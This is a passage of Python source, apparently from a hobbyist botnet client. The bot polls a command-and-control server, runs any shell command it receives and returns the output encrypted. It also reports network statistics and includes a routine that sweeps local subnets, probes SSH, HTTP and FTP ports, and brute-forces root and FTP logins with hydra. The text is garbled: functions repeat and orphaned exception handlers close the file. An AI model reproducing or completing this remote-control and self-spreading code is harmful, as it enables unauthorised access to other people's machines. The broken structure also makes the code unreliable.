                    logger.exception(f"Error executing simple command: {command}")
                    output = {'status': 'error', 'output': str(e)}

                logger.debug(f"Sending response for command ID {command_id}")
                send_response(command_id, output)

            def send_response(command_id, output):
                logger.info(f"Sending response for command ID {command_id}.")
                try:
                    response_payload = {'command_id': command_id, 'output': output}
                    logger.debug(f"Response payload (pre-encryption): {json.dumps(response_payload)}")
                    encrypted_response = encrypt_data(json.dumps(response_payload))
                    endpoint = build_c2_url(f'/api/bot/response/{BOT_ID}')
                    response = requests.post(endpoint, data=encrypted_response, proxies=proxies, timeout=120)
                    response.raise_for_status()
                    try:
                        response_data = response.json()
                    except (json.JSONDecodeError, ValueError):
                        response_data = {}
                    update_control_url(response_data.get('control_url'))
                    logger.info(f"Successfully sent response for command ID {command_id}")
                except requests.exceptions.RequestException:
                    logger.exception(f"Failed to send command response for command ID {command_id} due to network error.")
                except Exception:
                    logger.exception(f"An unexpected error occurred while sending response for command ID {command_id}.")


            # --- Ping Function ---
            def ping_c2():
                C2_SERVER = get_c2_address()  # Make sure this function exists


                # Check if registration file exists
                if os.path.exists('reg.csv'):
                    try:
                        with open('reg.csv', 'r') as f:
                            reader = csv.reader(f)
                            next(reader)  # skip header
                            reg_data = next(reader)
                            BOT_ID = reg_data[0]
                    except Exception:
                        logger.warning("Failed to read bot registration. Will attempt fresh registration.")

                while True:
                    try:
                        with open('reg.csv', 'r') as f:
                            reader = csv.reader(f)
                            next(reader) # skip header
                            reg_data = next(reader)
                            system_id = reg_data[0]

                        ping_payload = {'id': BOT_ID}
                        encrypted_payload = encrypt_data(json.dumps(ping_payload))
                        ping_url = build_c2_url('/api/bot/ping')
                        response = requests.post(ping_url, data=encrypted_payload, proxies=proxies, timeout=60)
                        try:
                            response_data = response.json()
                        except (json.JSONDecodeError, ValueError):
                            response_data = {}
                        update_control_url(response_data.get('control_url'))
                        logger.info(f"Sending POST request to {ping_url} with data: {encrypted_payload}")
                        logger.info("Sent ping to C2.")
                    except FileNotFoundError:
                        logger.warning("reg.csv not found. Bot not registered yet? Will retry ping later.")
                    except Exception as e:
                        logger.exception("An error occurred while sending ping to C2.")
                    time.sleep(10) # Ping every 10 seconds



            def handle_simple_command(command_obj):
                command = command_obj.get('command', '')
                command_id = command_obj.get('command_id')
                logger.info(f"Executing simple command: '{command}'")
                output = {'status': 'error', 'output': 'Unknown command'}

                try:
                    if command == 'ping':
                        output = {'status': 'ok', 'output': 'pong'}
                    elif command == 'sleep':
                        logger.info("Received 'sleep' command. No response needed.")
                        return
                    elif command == 'register':
                        logger.info("C2 requested re-registration.")
                        register_with_c2()
                        return
                    elif command.startswith('execute '):
                        cmd = command.split(' ', 1)[1]
                        logger.debug(f"Executing shell command: {cmd}")
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
                        command_output = result.stdout or result.stderr
                        output = {'status': 'ok', 'output': command_output}
                        logger.debug(f"Shell command executed. Output length: {len(command_output)}")
                    else:
                        logger.warning(f"Unknown simple command '{command}'.")

                except subprocess.TimeoutExpired:
                    logger.error(f"Shell command '{cmd}' timed out.")
                    output = {'status': 'error', 'output': 'Command timed out after 300 seconds.'}
                except Exception as e:
                    logger.exception(f"Error executing simple command: {command}")
                    output = {'status': 'error', 'output': str(e)}

                logger.debug(f"Sending response for command ID {command_id}")
                send_response(command_id, output)

            def send_response(command_id, output):
                logger.info(f"Sending response for command ID {command_id}.")
                try:
                    response_payload = {'command_id': command_id, 'output': output}
                    logger.debug(f"Response payload (pre-encryption): {json.dumps(response_payload)}")
                    encrypted_response = encrypt_data(json.dumps(response_payload))
                    endpoint = build_c2_url(f'/api/bot/response/{BOT_ID}')
                    response = requests.post(endpoint, data=encrypted_response, proxies=proxies, timeout=120)
                    response.raise_for_status()
                    try:
                        response_data = response.json()
                    except (json.JSONDecodeError, ValueError):
                        response_data = {}
                    update_control_url(response_data.get('control_url'))
                    logger.info(f"Successfully sent response for command ID {command_id}")
                except requests.exceptions.RequestException:
                    logger.exception(f"Failed to send command response for command ID {command_id} due to network error.")
                except Exception:
                    logger.exception(f"An unexpected error occurred while sending response for command ID {command_id}.")







            # --- Detailed Logging Configuration ---
            logging.basicConfig(
                level=logging.DEBUG,
                format='%(asctime)s - %(name)s - %(levelname)s - %(threadName)s - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            logger = logging.getLogger('Scanner')

            # --- Network Scanning Functions ---
            def scan_lan(subnet):
                logger.info(f"Scanning LAN subnet: {subnet}")
                try:
                    ans, unans = sr(IP(dst=subnet)/ICMP(), timeout=2, verbose=0)
                    alive_hosts = [snd[IP].dst for snd, rcv in ans]
                    logger.info(f"Alive hosts in LAN: {alive_hosts}")
                    return alive_hosts
                except Exception as e:
                    logger.error(f"Error scanning LAN: {e}")
                    return []

            def scan_wan():
                logger.info("Scanning WAN")
                try:
                    external_ip = requests.get('https://api.ipify.org?format=json').json()['ip']
                    logger.info(f"External IP: {external_ip}")
                    return [external_ip]
                except Exception as e:
                    logger.error(f"Error scanning WAN: {e}")
                    return []

            def scan_man():
                logger.info("Scanning MAN")
                try:
                    # Assuming MAN is a larger subnet that includes the LAN
                    man_subnet = '192.168.0.0/16'  # Example subnet for MAN
                    ans, unans = sr(IP(dst=man_subnet)/ICMP(), timeout=2, verbose=0)
                    alive_hosts = [snd[IP].dst for snd, rcv in ans]
                    logger.info(f"Alive hosts in MAN: {alive_hosts}")
                    return alive_hosts
                except Exception as e:
                    logger.error(f"Error scanning MAN: {e}")
                    return []

            # --- Vulnerability Checking Functions ---
            def check_vulnerable_port(host, port):
                logger.debug(f"Checking port {port} on host {host}")
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((host, port))
                    sock.close()
                    return result == 0
                except Exception as e:
                    logger.error(f"Error checking port {port} on host {host}: {e}")
                    return False

            def check_vulnerable_service(host, port, service):
                logger.debug(f"Checking service {service} on host {host} port {port}")
                try:
                    if service == 'ssh':
                        return check_ssh_vulnerable(host, port)
                    elif service == 'http':
                        return check_http_vulnerable(host, port)
                    elif service == 'ftp':
                        return check_ftp_vulnerable(host, port)
                    else:
                        logger.warning(f"Unknown service: {service}")
                        return False
                except Exception as e:
                    logger.error(f"Error checking service {service} on host {host} port {port}: {e}")
                    return False

            def check_ssh_vulnerable(host, port):
                logger.debug(f"Checking SSH vulnerability on {host}:{port}")
                try:
                    # Example: Check for weak SSH keys
                    if platform.system() == 'Windows':
                        command = f'powershell -Command "ssh-keyscan -p {port} {host}"'
                    else:
                        command = f'ssh-keyscan -p {port} {host}'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if 'DSA' in result.stdout:
                        logger.info(f"SSH DSA key found on {host}:{port}")
                        return True
                    return False
                except Exception as e:
                    logger.error(f"Error checking SSH vulnerability on {host}:{port}: {e}")
                    return False

            def check_http_vulnerable(host, port):
                logger.debug(f"Checking HTTP vulnerability on {host}:{port}")
                try:
                    response = requests.get(f'http://{host}:{port}', timeout=5)
                    if response.status_code == 200:
                        logger.info(f"HTTP service is running on {host}:{port}")
                        return True
                    return False
                except Exception as e:
                    logger.error(f"Error checking HTTP vulnerability on {host}:{port}: {e}")
                    return False

            def check_ftp_vulnerable(host, port):
                logger.debug(f"Checking FTP vulnerability on {host}:{port}")
                try:
                    # Example: Check for anonymous login
                    response = requests.get(f'ftp://{host}:{port}/', timeout=5, auth=('anonymous', 'anonymous'))
                    if response.status_code == 200:
                        logger.info(f"FTP anonymous login successful on {host}:{port}")
                        return True
                    return False
                except Exception as e:
                    logger.error(f"Error checking FTP vulnerability on {host}:{port}: {e}")
                    return False

            # --- Exploitation Functions ---
            def exploit_ssh(host, port):
                logger.info(f"Exploiting SSH on {host}:{port}")
                try:
                    # Example: Use Hydra to brute-force SSH credentials
                    command = f'hydra -l root -P /home/z3r0/PROJECTS/botnet/list.txt {host} -s {port} ssh'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if 'cracked' in result.stdout:
                        logger.info(f"SSH credentials cracked on {host}:{port}")
                    else:
                        logger.info(f"SSH exploitation failed on {host}:{port}")
                except Exception as e:
                    logger.error(f"Error exploiting SSH on {host}:{port}: {e}")

            def exploit_http(host, port):
                logger.info(f"Exploiting HTTP on {host}:{port}")
                try:
                    # Example: Use Nikto to scan for HTTP vulnerabilities
                    command = f'nikto -h {host}:{port}'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if 'vulnerable' in result.stdout:
                        logger.info(f"HTTP vulnerabilities found on {host}:{port}")
                    else:
                        logger.info(f"HTTP exploitation failed on {host}:{port}")
                except Exception as e:
                    logger.error(f"Error exploiting HTTP on {host}:{port}: {e}")

            def exploit_ftp(host, port):
                logger.info(f"Exploiting FTP on {host}:{port}")
                try:
                    # Example: Use Hydra to brute-force FTP credentials
                    command = f'hydra -l anonymous -P /path/to/password/list.txt {host} -s {port} ftp'
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    if 'cracked' in result.stdout:
                        logger.info(f"FTP credentials cracked on {host}:{port}")
                    else:
                        logger.info(f"FTP exploitation failed on {host}:{port}")
                except Exception as e:
                    logger.error(f"Error exploiting FTP on {host}:{port}: {e}")

            # --- Main Scanning and Exploitation Function ---
            def scan_and_exploit():
                logger.info("Starting scan and exploit process")

                # Scan networks
                lan_hosts = scan_lan('192.168.1.0/24')  # Example LAN subnet
                wan_hosts = scan_wan()
                man_hosts = scan_man()

                all_hosts = lan_hosts + wan_hosts + man_hosts
                logger.info(f"Total hosts to scan: {len(all_hosts)}")

                vulnerable_hosts = []

                for host in all_hosts:
                    logger.info(f"Scanning host: {host}")

                    # Check common ports
                    common_ports = [22, 80, 443, 21]
                    for port in common_ports:
                        if check_vulnerable_port(host, port):
                            logger.info(f"Port {port} is open on {host}")

                            # Check for vulnerable services
                            if port == 22:
                                if check_vulnerable_service(host, port, 'ssh'):
                                    vulnerable_hosts.append((host, port, 'ssh'))
                            elif port == 80:
                                if check_vulnerable_service(host, port, 'http'):
                                    vulnerable_hosts.append((host, port, 'http'))
                            elif port == 21:
                                if check_vulnerable_service(host, port, 'ftp'):
                                    vulnerable_hosts.append((host, port, 'ftp'))

                logger.info(f"Vulnerable hosts found: {vulnerable_hosts}")

                # Exploit vulnerable hosts
                for host, port, service in vulnerable_hosts:
                    if service == 'ssh':
                        exploit_ssh(host, port)
                    elif service == 'http':
                        exploit_http(host, port)
                    elif service == 'ftp':
                        exploit_ftp(host, port)

            def send_network_stats():
                while True:
                    try:
                        net_io = psutil.net_io_counters()
                        stats = {
                            'bytes_sent': net_io.bytes_sent,
                            'bytes_recv': net_io.bytes_recv
                        }
                        endpoint = build_c2_url(f"/api/bot/net_stats/{BOT_ID}")
                        response = requests.post(endpoint, json=stats, proxies=proxies, timeout=10)
                        try:
                            response_data = response.json()
                        except (json.JSONDecodeError, ValueError):
                            response_data = {}
                        update_control_url(response_data.get('control_url'))
                    except Exception as e:
                        logger.warning(f"Could not send network stats: {e}")
                    time.sleep(10)










    except KeyboardInterrupt:
        debug("Script interrupted by user.")
    except Exception as e:
        logger.error(f"Unhandled exception in __main__: {e}", exc_info=True)


    except requests.exceptions.RequestException:
        logger.exception("Error polling C2. Will retry after a delay.")
        time.sleep(10)
    except Exception:
        logger.exception("An unexpected error occurred in the main loop. Will retry after a delay.")
        time.sleep(10)
